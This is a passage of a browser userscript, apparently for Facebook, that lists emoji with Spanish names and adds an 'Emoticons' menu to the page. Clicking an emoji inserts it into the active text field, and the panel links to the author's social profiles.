		"chars" : " \ud83d\udc2c ",
		"class" : "_1az _1a- _2di",
		"name" : "Delfín"
	}, {
		"chars" : " \ud83d\udc2d ",
		"class" : "_1az _1a- _2dj",
		"name" : "Cara de ratón"
	}, {
		"chars" : " \ud83d\udc2e ",
		"class" : "_1az _1a- _2dk",
		"name" : "Cara de vaca"
	}, {
		"chars" : " \ud83d\udc2f ",
		"class" : "_1az _1a- _2dl",
		"name" : "Cara de tigre"
	}, {
		"chars" : " \ud83d\udc30 ",
		"class" : "_1az _1a- _2dm",
		"name" : "Cara de conejo"
	}, {
		"chars" : " \ud83d\udc31 ",
		"class" : "_1az _1a- _2dn",
		"name" : "Cara de gato"
	}, {
		"chars" : " \ud83d\udc33 ",
		"class" : "_1az _1a- _2do",
		"name" : "Ballena escupiendo agua"
	}, {
		"chars" : " \ud83d\udc34 ",
		"class" : "_1az _1a- _2dp",
		"name" : "Cara de caballo"
	}, {
		"chars" : " \ud83d\udc35 ",
		"class" : "_1az _1a- _2dq",
		"name" : "Cara de mono"
	}, {
		"chars" : " \ud83d\udc37 ",
		"class" : "_1az _1a- _2dr",
		"name" : "Cara de cerdo"
	}, {
		"chars" : " \ud83d\udc38 ",
		"class" : "_1az _1a- _2ds",
		"name" : "Cara de rana"
	}, {
		"chars" : " \ud83d\udc39 ",
		"class" : "_1az _1a- _2dt",
		"name" : "Cara de hamster"
	}, {
		"chars" : " \ud83d\udc3a ",
		"class" : "_1az _1a- _2du",
		"name" : "Cara de lobo"
	}, {
		"chars" : " \ud83d\udc3b ",
		"class" : "_1az _1a- _2dv",
		"name" : "Cara de oso"
	}, {
		"chars" : " \ud83d\udc3e ",
		"class" : "_1az _1a- _2dw",
		"name" : "Huellas"
	}, {
		"chars" : " \ud83d\udc40 ",
		"class" : "_1az _1a- _2dx",
		"name" : "Ojos"
	}, {
		"chars" : " \ud83d\udc42 ",
		"class" : "_1az _1a- _2dy",
		"name" : "Oreja"
	}, {
		"chars" : " \ud83d\udc43 ",
		"class" : "_1az _1a- _2dz",
		"name" : "Nariz"
	}, {
		"chars" : " \ud83d\udc44 ",
		"class" : "_1az _1a- _2d-",
		"name" : "Boca"
	}, {
		"chars" : " \ud83d\udc45 ",
		"class" : "_1az _1a- _2d_",
		"name" : "Lengua"
	}, {
		"chars" : " \ud83d\udc46 ",
		"class" : "_1az _1a- _2e0",
		"name" : "Mano blanca indicando hacia arriba"
	}, {
		"chars" : " \ud83d\udc47 ",
		"class" : "_1az _1a- _2e1",
		"name" : "Mano blanca indicando hacia abajo"
	}, {
		"chars" : " \ud83d\udc48 ",
		"class" : "_1az _1a- _2e2",
		"name" : "Mano blanca indicando hacia la izquierda"
	}, {
		"chars" : " \ud83d\udc49 ",
		"class" : "_1az _1a- _2e3",
		"name" : "Mano blanca indicando hacia la derecha"
	}, {
		"chars" : " \ud83d\udc4a ",
		"class" : "_1az _1a- _2e4",
		"name" : "Puño"
	}, {
		"chars" : " \ud83d\udc4b ",
		"class" : "_1az _1a- _2e5",
		"name" : "Mano en movimiento"
	}, {
		"chars" : " \ud83d\udc4c ",
		"class" : "_1az _1a- _2e6",
		"name" : "Mano indicando todo bien"
	}, {
		"chars" : " \ud83d\udc4d ",
		"class" : "_1az _1a- _2e7",
		"name" : "Mano con pulgar arriba"
	}, {
		"chars" : " \ud83d\udc4e ",
		"class" : "_1az _1a- _2e8",
		"name" : "Mano con pulgar abajo"
	}, {
		"chars" : " \ud83d\udc4f ",
		"class" : "_1az _1a- _2e9",
		"name" : "Manos aplaudiendo"
	}, {
		"chars" : " \ud83d\udc50 ",
		"class" : "_1az _1a- _2ea",
		"name" : "Manos abiertas"
	}, {
		"chars" : " \ud83d\udc66 ",
		"class" : "_1az _1a- _2eb",
		"name" : "Chico"
	}, {
		"chars" : " \ud83d\udc67 ",
		"class" : "_1az _1a- _2ec",
		"name" : "Chica"
	}, {
		"chars" : " \ud83d\udc68 ",
		"class" : "_1az _1a- _2ed",
		"name" : "Hombre"
	}, {
		"chars" : " \ud83d\udc69 ",
		"class" : "_1az _1a- _2ee",
		"name" : "Mujer"
	}, {
		"chars" : " \ud83d\udc6b ",
		"class" : "_1az _1a- _2ef",
		"name" : "Hombre y mujer agarrados de las manos"
	}, {
		"chars" : " \ud83d\udc6e ",
		"class" : "_1az _1a- _2eg",
		"name" : "Oficial de policía"
	}, {
		"chars" : " \ud83d\udc6f ",
		"class" : "_1az _1a- _2eh",
		"name" : "Mujer con orejas de conejo"
	}, {
		"chars" : " \ud83d\udc71 ",
		"class" : "_1az _1a- _2ei",
		"name" : "Persona con pelo rubio"
	}, {
		"chars" : " \ud83d\udc72 ",
		"class" : "_1az _1a- _2ej",
		"name" : "Hombre con gua pi mao"
	}, {
		"chars" : " \ud83d\udc73 ",
		"class" : "_1az _1a- _2ek",
		"name" : "Hombre con turbante"
	}, {
		"chars" : " \ud83d\udc74 ",
		"class" : "_1az _1a- _2el",
		"name" : "Hombre viejo"
	}, {
		"chars" : " \ud83d\udc75 ",
		"class" : "_1az _1a- _2em",
		"name" : "Mujer vieja"
	}, {
		"chars" : " \ud83d\udc76 ",
		"class" : "_1az _1a- _2en",
		"name" : "Bebé"
	}, {
		"chars" : " \ud83d\udc77 ",
		"class" : "_1az _1a- _2eo",
		"name" : "Trabajador de construcción"
	}, {
		"chars" : " \ud83d\udc78 ",
		"class" : "_1az _1a- _2ep",
		"name" : "Princesa"
	}, {
		"chars" : " \ud83d\udc7b ",
		"class" : "_1az _1a- _2eq",
		"name" : "Fantasma"
	}, {
		"chars" : " \ud83d\udc7c ",
		"class" : "_1az _1a- _2er",
		"name" : "Ángel bebé"
	}, {
		"chars" : " \ud83d\udc7d ",
		"class" : "_1az _1a- _2es",
		"name" : "Extraterrestre"
	}, {
		"chars" : " \ud83d\udc7e ",
		"class" : "_1az _1a- _2et",
		"name" : "Monstruo Extraterrestre"
	}, {
		"chars" : " \ud83d\udc7f ",
		"class" : "_1az _1a- _2eu",
		"name" : "Diablillo"
	}, {
		"chars" : " \ud83d\udc80 ",
		"class" : "_1az _1a- _2ev",
		"name" : "Cráneo"
	}, {
		"chars" : " \ud83d\udc82 ",
		"class" : "_1az _1a- _2ew",
		"name" : "Guardia"
	}, {
		"chars" : " \ud83d\udc83 ",
		"class" : "_1az _1a- _2ex",
		"name" : "Bailarina"
	}, {
		"chars" : " \ud83d\udc85 ",
		"class" : "_1az _1a- _2ey",
		"name" : "Esmalte de uñas"
	}, {
		"chars" : " \ud83d\udc8b ",
		"class" : "_1az _1a- _2ez",
		"name" : "Marca de beso"
	}, {
		"chars" : " \ud83d\udc8f ",
		"class" : "_1az _1a- _2e-",
		"name" : "Beso pareja"
	}, {
		"chars" : " \ud83d\udc90 ",
		"class" : "_1az _1a- _2e_",
		"name" : "Ramo de flores"
	}, {
		"chars" : " \ud83d\udc91 ",
		"class" : "_1az _1a- _2f0",
		"name" : "Pareja con corazón"
	}, {
		"chars" : " \ud83d\udc93 ",
		"class" : "_1az _1a- _2f1",
		"name" : "Corazón latiendo"
	}, {
		"chars" : " \ud83d\udc94 ",
		"class" : "_1az _1a- _2f2",
		"name" : "Corazón roto"
	}, {
		"chars" : " \ud83d\udc96 ",
		"class" : "_1az _1a- _2f3",
		"name" : "Corazón brillante"
	}, {
		"chars" : " \ud83d\udc97 ",
		"class" : "_1az _1a- _2f4",
		"name" : "Corazón creciente"
	}, {
		"chars" : " \ud83d\udc98 ",
		"class" : "_1az _1a- _2f5",
		"name" : "Corazón con flecha"
	}, {
		"chars" : " \ud83d\udc99 ",
		"class" : "_1az _1a- _2f6",
		"name" : "Corazón azul"
	}, {
		"chars" : " \ud83d\udc9a ",
		"class" : "_1az _1a- _2f7",
		"name" : "Corazón verde"
	}, {
		"chars" : " \ud83d\udc9b ",
		"class" : "_1az _1a- _2f8",
		"name" : "Corazón amarillo"
	}, {
		"chars" : " \ud83d\udc9c ",
		"class" : "_1az _1a- _2f9",
		"name" : "Corazón morado"
	}, {
		"chars" : " \ud83d\udc9d ",
		"class" : "_1az _1a- _2fa",
		"name" : "Corazón con lazo"
	}, {
		"chars" : " \ud83d\udca2 ",
		"class" : "_1az _1a- _2fb",
		"name" : "Símbolo de enojo"
	}, {
		"chars" : " \ud83d\udca4 ",
		"class" : "_1az _1a- _2fc",
		"name" : "Durmiendo"
	}, {
		"chars" : " \ud83d\udca6 ",
		"class" : "_1az _1a- _2fd",
		"name" : "Símbolo de gotas de sudor"
	}, {
		"chars" : " \ud83d\udca8 ",
		"class" : "_1az _1a- _2fe",
		"name" : "Símbolo de arranque rápido"
	}, {
		"chars" : " \ud83d\udca9 ",
		"class" : "_1az _1a- _2ff",
		"name" : "Pila de cacá"
	}, {
		"chars" : " \ud83d\udcaa ",
		"class" : "_1az _1a- _2fg",
		"name" : "Bícep flexionado"
	}, {
		"chars" : " \ud83d\udcbb ",
		"class" : "_1az _1a- _2fh",
		"name" : "Computadora personal"
	}, {
		"chars" : " \ud83d\udcbd ",
		"class" : "_1az _1a- _2fi",
		"name" : "Minidisco"
	}, {
		"chars" : " \ud83d\udcbe ",
		"class" : "_1az _1a- _2fj",
		"name" : "Disco flexible"
	}, {
		"chars" : " \ud83d\udcbf ",
		"class" : "_1az _1a- _2fk",
		"name" : "Disco óptico"
	}, {
		"chars" : " \ud83d\udcc0 ",
		"class" : "_1az _1a- _2fl",
		"name" : "DVD"
	}, {
		"chars" : " \ud83d\udcde ",
		"class" : "_1az _1a- _2fm",
		"name" : "Receptor de teléfono"
	}, {
		"chars" : " \ud83d\udce0 ",
		"class" : "_1az _1a- _2fn",
		"name" : "Fax"
	}, {
		"chars" : " \ud83d\udcf1 ",
		"class" : "_1az _1a- _2fo",
		"name" : "Teléfono móvil"
	}, {
		"chars" : " \ud83d\udcf2 ",
		"class" : "_1az _1a- _2fp",
		"name" : "Teléfono móvil con flecha de izquierda a derecha"
	}, {
		"chars" : " \ud83d\udcfa ",
		"class" : "_1az _1a- _2fq",
		"name" : "Televisión"
	}, {
		"chars" : " \ud83d\udd14 ",
		"class" : "_1az _1a- _2fr",
		"name" : "Campana"
	}, {
		"chars" : " \ud83d\ude01 ",
		"class" : "_1az _1a- _2fs",
		"name" : "Cara de mueca con ojos sonrientes"
	}, {
		"chars" : " \ud83d\ude02 ",
		"class" : "_1az _1a- _2ft",
		"name" : "Cara con lágrimas de alegría"
	}, {
		"chars" : " \ud83d\ude03 ",
		"class" : "_1az _1a- _2fu",
		"name" : "Cara sonriente con boca abierta"
	}, {
		"chars" : " \ud83d\ude04 ",
		"class" : "_1az _1a- _2fv",
		"name" : "Cara y ojos sonrientes con boca abierta"
	}, {
		"chars" : " \ud83d\ude06 ",
		"class" : "_1az _1a- _2fw",
		"name" : "Cara sonriente con boca abierta y ojos bien cerrados"
	}, {
		"chars" : " \ud83d\ude09 ",
		"class" : "_1az _1a- _2fx",
		"name" : "Cara guiñando ojo"
	}, {
		"chars" : " \ud83d\ude0b ",
		"class" : "_1az _1a- _2fy",
		"name" : "Cara saboreando una comida deliciosa"
	}, {
		"chars" : " \ud83d\ude0c ",
		"class" : "_1az _1a- _2fz",
		"name" : "Cara de alivio"
	}, {
		"chars" : " \ud83d\ude0d ",
		"class" : "_1az _1a- _2f-",
		"name" : "Cara sonriente con ojos en forma de corazón"
	}, {
		"chars" : " \ud83d\ude0f ",
		"class" : "_1az _1a- _2f_",
		"name" : "Cara de sonrisa burlona"
	}, {
		"chars" : " \ud83d\ude12 ",
		"class" : "_1az _1a- _2g0",
		"name" : "Cara de aburrimiento"
	}, {
		"chars" : " \ud83d\ude13 ",
		"class" : "_1az _1a- _2g1",
		"name" : "Cara con sudor frio"
	}, {
		"chars" : " \ud83d\ude14 ",
		"class" : "_1az _1a- _2g2",
		"name" : "Cara pensativa"
	}, {
		"chars" : " \ud83d\ude16 ",
		"class" : "_1az _1a- _2g3",
		"name" : "Cara de confundido"
	}, {
		"chars" : " \ud83d\ude18 ",
		"class" : "_1az _1a- _2g4",
		"name" : "Cara arrojando beso"
	}, {
		"chars" : " \ud83d\ude1a ",
		"class" : "_1az _1a- _2g5",
		"name" : "Cara besando con ojos cerrados"
	}, {
		"chars" : " \ud83d\ude1c ",
		"class" : "_1az _1a- _2g6",
		"name" : "Cara con lengua afuera y guiñando un ojo"
	}, {
		"chars" : " \ud83d\ude1d ",
		"class" : "_1az _1a- _2g7",
		"name" : "Cara con lengua afuera y ojos muy cerrados"
	}, {
		"chars" : " \ud83d\ude1e ",
		"class" : "_1az _1a- _2g8",
		"name" : "Cara desanimada"
	}, {
		"chars" : " \ud83d\ude20 ",
		"class" : "_1az _1a- _2g9",
		"name" : "Cara de enojo"
	}, {
		"chars" : " \ud83d\ude21 ",
		"class" : "_1az _1a- _2ga",
		"name" : "Cara de mucho enojo"
	}, {
		"chars" : " \ud83d\ude22 ",
		"class" : "_1az _1a- _2gb",
		"name" : "Cara llorando"
	}, {
		"chars" : " \ud83d\ude23 ",
		"class" : "_1az _1a- _2gc",
		"name" : "Cara de perseverancia"
	}, {
		"chars" : " \ud83d\ude24 ",
		"class" : "_1az _1a- _2gd",
		"name" : "Cara de triunfo"
	}, {
		"chars" : " \ud83d\ude25 ",
		"class" : "_1az _1a- _2ge",
		"name" : "Cara desanimada pero aliviada"
	}, {
		"chars" : " \ud83d\ude28 ",
		"class" : "_1az _1a- _2gf",
		"name" : "Cara de miedoso"
	}, {
		"chars" : " \ud83d\ude29 ",
		"class" : "_1az _1a- _2gg",
		"name" : "Cara de fatigado"
	}, {
		"chars" : " \ud83d\ude2a ",
		"class" : "_1az _1a- _2gh",
		"name" : "Cara de dormido"
	}, {
		"chars" : " \ud83d\ude2b ",
		"class" : "_1az _1a- _2gi",
		"name" : "Cara de cansado"
	}, {
		"chars" : " \ud83d\ude2d ",
		"class" : "_1az _1a- _2gj",
		"name" : "Cara gritando"
	}, {
		"chars" : " \ud83d\ude30 ",
		"class" : "_1az _1a- _2gk",
		"name" : "Cara con boca abierta y sudor frio"
	}, {
		"chars" : " \ud83d\ude31 ",
		"class" : "_1az _1a- _2gl",
		"name" : "Cara aterrada de miedo"
	}, {
		"chars" : " \ud83d\ude32 ",
		"class" : "_1az _1a- _2gm",
		"name" : "Cara de muy sorprendido"
	}, {
		"chars" : " \ud83d\ude33 ",
		"class" : "_1az _1a- _2gn",
		"name" : "Cara sonrojada"
	}, {
		"chars" : " \ud83d\ude35 ",
		"class" : "_1az _1a- _2go",
		"name" : "Cara mareada"
	}, {
		"chars" : " \ud83d\ude37 ",
		"class" : "_1az _1a- _2gp",
		"name" : "Cara con mascarilla médica"
	}, {
		"chars" : " \ud83d\ude38 ",
		"class" : "_1az _1a- _2gq",
		"name" : "Cara de gato haciendo muecas y ojos cerrados"
	}, {
		"chars" : " \ud83d\ude39 ",
		"class" : "_1az _1a- _2gr",
		"name" : "Cara de gato con lágrimas de risa"
	}, {
		"chars" : " \ud83d\ude3a ",
		"class" : "_1az _1a- _2gs",
		"name" : "Cara de gato sonriente con boca abierta"
	}, {
		"chars" : " \ud83d\ude3b ",
		"class" : "_1az _1a- _2gt",
		"name" : "Cara de gato sonriente con corazones en los ojos"
	}, {
		"chars" : " \ud83d\ude3c ",
		"class" : "_1az _1a- _2gu",
		"name" : "Cara de gato con sonrisa torcida"
	}, {
		"chars" : " \ud83d\ude3d ",
		"class" : "_1az _1a- _2gv",
		"name" : "Cara de gato besando con ojos cerrados"
	}, {
		"chars" : " \ud83d\ude3f ",
		"class" : "_1az _1a- _2gw",
		"name" : "Cara de gato llorando"
	}, {
		"chars" : " \ud83d\ude40 ",
		"class" : "_1az _1a- _2gx",
		"name" : "Cara de gato aterrada de miedo"
	}, {
		"chars" : " \ud83d\ude4b ",
		"class" : "_1az _1a- _2gy",
		"name" : "Persona feliz levantando una mano"
	}, {
		"chars" : " \ud83d\ude4c ",
		"class" : "_1az _1a- _2gz",
		"name" : "Persona levantando ambas manos en celebración"
	}, {
		"chars" : " \ud83d\ude4d ",
		"class" : "_1az _1a- _2g-",
		"name" : "Persona frunciendo el ceño"
	}, {
		"chars" : " \ud83d\ude4f ",
		"class" : "_1az _1a- _2g_",
		"name" : "Persona en plegaria"
	}, {
		"chars" : " \u261d ",
		"class" : "_1az _1a- _2h0",
		"name" : "Dedo índice señalando hacia arriba"
	}, {
		"chars" : " \u263a ",
		"class" : "_1az _1a- _2h1",
		"name" : "Cara blanca sonriendo"
	}, {
		"chars" : " \u26a1 ",
		"class" : "_1az _1a- _2h2",
		"name" : "Símbolo de alto voltaje"
	}, {
		"chars" : " \u26c4 ",
		"class" : "_1az _1a- _2h3",
		"name" : "Muñeco de nieve sin nieve"
	}, {
		"chars" : " \u270a ",
		"class" : "_1az _1a- _2h4",
		"name" : "Puño hacia arriba"
	}, {
		"chars" : " \u270b ",
		"class" : "_1az _1a- _2h5",
		"name" : "Mano hacia arriba"
	}, {
		"chars" : " \u270c ",
		"class" : "_1az _1a- _2h6",
		"name" : "Mano de victoria"
	}, {
		"chars" : " \u2600 ",
		"class" : "_1az _1a- _2h7",
		"name" : "Sol con rayos solares"
	}, {
		"chars" : " \u2601 ",
		"class" : "_1az _1a- _2h8",
		"name" : "Nube"
	}, {
		"chars" : " \u2614 ",
		"class" : "_1az _1a- _2h9",
		"name" : "Sombrilla con gotas de lluvia"
	}, {
		"chars" : " \u2615 ",
		"class" : "_1az _1a- _2ha",
		"name" : "Bebida caliente"
	}, {
		"chars" : " \u2728 ",
		"class" : "_1az _1a- _2hb",
		"name" : "Brillo"
	}, {
		"chars" : " \u2764 ",
		"class" : "_1az _1a- _2hc",
		"name" : "Corazón negro pesado"
	} ];

	// = Variables =======
	var lastActiveElement = document.activeElement;

	// = Functions =======
	function createElement(html) {
		var outerHTML = document.createElement("div");
		outerHTML.innerHTML = html;
		return outerHTML.firstChild;
	}

	function htmlSpecialChars(string) {
		var div = document.createElement("div");
		var text = document.createTextNode(string);
		div.appendChild(text);
		return div.innerHTML;
	}

	function isInstanceOfTextInput(element) {
		return (element instanceof HTMLInputElement && element.type == "text")
				|| element instanceof HTMLTextAreaElement;
	}

	function isFlyoutOpen(flyout) {
		return flyout.className == "openToggler";
	}

	function openFlyout(flyout, open) {
		if (open === undefined) {
			open = !isFlyoutOpen(flyout); // Toggle
		}

		if (open) {
			flyout.className = "openToggler";
		} else {
			flyout.removeAttribute("class");
		}
	}

	function createTab(titleContainer, bodyContainer) {
		var html;
		// Tab; default = inactive
	   	html = '<li class="jewelFlyout fbJewelFlyout uiToggleFlyout">';
		html += '<div class="jewelFlyout">';
		html += '</div>';
		html += '</li>';
		var title = createElement(html);
		titleContainer.appendChild(title);

		// Manual input
		html = '<div style="display: none;">';
		html += '</div>';
		var body = createElement(html);
		bodyContainer.appendChild(body);

		// Change tab listener
		(function(body) {
			title.addEventListener("click", function() {
				// Change tab
				var titles = this.parentNode.childNodes; // tab.tabContainer.childNodes
				for ( var t = 0; t < titles.length; t++) {
					if (titles[t] === this) { // Active
						
					} else { // Inactive
						titles[t].style.background = "";
						titles[t].firstChild.style.color = "";
					}
				}

				// Change body
				var bodies = body.parentNode.childNodes; // body.bodyContainer.childNodes
				for ( var b = 0; b < bodies.length; b++) {
					if (bodies[b] === body) { // Show
						body.style.display = "";
					} else { // Hide
						bodies[b].style.display = "none";
					}
				}
			});
		})(body);

		return {
			"title" : title.firstChild,
			"body" : body
		};
	}

	function createTabListBody(emoticons, filter) {
		var html;

		html = '<div style="max-height: 200px; padding-right: 15px; overflow-x: hidden; line-height: 1em;">';
		html += '<div style="padding: 10px; width: 200px; font-size: 15px;">';
		html += '</div>';
		html += '</div>';
		var body = createElement(html).firstChild;
		for ( var e = 0; e < emoticons.length; e++) {
			var emoticon = emoticons[e];
			if (!filter(emoticon)) {
				continue;
			}

			// Icons
			html = '<span class="panelCell" style="display: inline-block; vertical-align: middle; padding: 2px;">';
			html += '<a';
			html += ' class="emoticon'
					+ (emoticon.class !== undefined ? ' ' + emoticon.class : '')
					+ '"';
			html += ' style="text-decoration: inherit; color: inherit;'
					+ (emoticon.class !== undefined ? ' color: transparent;'
							: ' width: auto;') + '"';
			html += (emoticon.name !== undefined ? ' title="' + emoticon.name
					+ '"' : '');
			html += '>';
			html += htmlSpecialChars(emoticon.chars);
			html += '</a>';
			html += '</span>';
			var cell = createElement(html);
			body.appendChild(cell);

			// Select emoticon listener
			var emoticonA = cell.firstChild;
			(function(emoticon) {
				emoticonA.addEventListener("click", function() {
					if (isInstanceOfTextInput(lastActiveElement)) {
						lastActiveElement.focus();

						var chars = emoticon.chars;
						var value = lastActiveElement.value;
						var start = lastActiveElement.selectionStart;
						var end = lastActiveElement.selectionEnd;
						lastActiveElement.value = value.substring(0, start)
								+ chars + value.substring(end);
						lastActiveElement.setSelectionRange(start + chars.length, start + chars.length);
					}

					openFlyoutCommand = false; // Close flyout
				});
			})(emoticon);
		}

		return body.parentNode;
	}

	// = Construct UI =======
	var html;

	// Menu item
	// var navItem
	html = '<li class="navItem middleItem notifNegativeBase">';
	html += '<div class="fbJewel">';
	// {

	// Toggler
	html += '<a class="navLink" title="Emoticones">'; // var navLink
	html += '<span class="emoticon emoticon_smile" style="vertical-align: middle;"></span>';
	html += '<span class="headerTinymanName"> Emoticons</span>';
	html += '</a>';
	html += '</a>';
	
	
	// Flyout
	html += '<div>'; // openToggler; var flyout
	html += '<div class="emoticonsPanel fbJewelFlyout uiToggleFlyout" style="z-index: 1; width: auto;">';
	// {

	
	// Beeper
	html += '<div class="jewelBeeperHeader">';
	html += '<div class="beeperNubWrapper">';
	html += '<div class="beeperNub" style="left: 4px;"></div>';
	html += '</div>';
	html += '</div>';

	// Title
	
	html += '<div class="uiHeader uiHeaderBottomBorder jewelHeader">';
	html += '<div class="clearfix uiHeaderTop">';
	html += '<div class="rfloat">';
	html += '<h3 class="accessible_elem">Feature</h3>';
	html += '<div class="uiHeaderActions fsm fwn fcg">';
	html += '<a href="https://www.facebook.com/ArxEromax" target="_blank" class=""><img style="width: auto; height: auto;" src="http://m-static.ak.fbcdn.net/rsrc.php/yl/r/H3nktOa7ZMg.ico"></a> · <a href="https://twitter.com/AzwadArxEromax" target="_blank" class=""><img style="width: auto; height: auto;" src="https://abs.twimg.com/favicons/favicon.ico"></a>';
	html += '</div>';
	html += '</div>';
	html += '<div><h3 class="uiHeaderTitle" aria-hidden="true">Emoticons</h3></div>';
	html += '</div>';
	html += '</div>';

	// Tabs
	// var titleContainer
	html += '<ul style="display: table; width: 100%; text-align: center;">';
	html += '</ul>';

	// Bodies
	html += '<div>'; // var bodyContainer
	html += '</div>';

	// Footer
	html += '<div class="jewelFooter">';
	html += '<a style="font-weight:bold;" ajaxify="/ajax/messaging/composer.php?ids%5B0%5D=100006297124569&amp;ref=timeline" href="/messages/ArxEromax" role="button" rel="dialog"><span class="_1az _1a- _2fp"></span> Help & FAQ</a>';
	html += '</div>';

	// }
	html += '</div>'; // emoticonsPanel
	html += '</div>'; // openToggler

	// }
	html += '</div>'; // fbJewel
	html += '</li>'; // navItem

	var navItem = createElement(html);
	var pageNav = document.querySelector("#pageNav");
	pageNav.insertBefore(navItem, pageNav.firstChild);

	// Maintain active element
	navItem.addEventListener("click", function() {
		if (isInstanceOfTextInput(lastActiveElement)) {
			lastActiveElement.focus();
		}

		openFlyoutCommand = undefined; // Do nothing
	}, true);

	var navLink = navItem.firstChild.firstChild;
	var flyout = navLink.nextSibling;
	var titleContainer = flyout.firstChild.childNodes[1];
	var bodyContainer = titleContainer.nextSibling;

	// Toggle listener
	navLink.addEventListener("click", function() {
		openFlyoutCommand = !isFlyoutOpen(flyout);
	});

	// Picture emoticon tab
	var picEmoTab = createTab(titleContainer, bodyContainer);
	picEmoTab.title.click(); // Default tab
	
	picEmoTab.body.appendChild(createTabListBody(emoticons, function(emoticon) {
		if (emoticon.class === undefined) { // No picture
			return false;
		}

		return true;

			}));

	// = Other listener =======

	document.addEventListener("click", function() {
		// Get active textarea
		lastActiveElement = document.activeElement;

		// Toggle flyout
		if (openFlyoutCommand !== undefined) {
			openFlyout(flyout, openFlyoutCommand);
		}
		openFlyoutCommand = false;
	});
})(); 

//---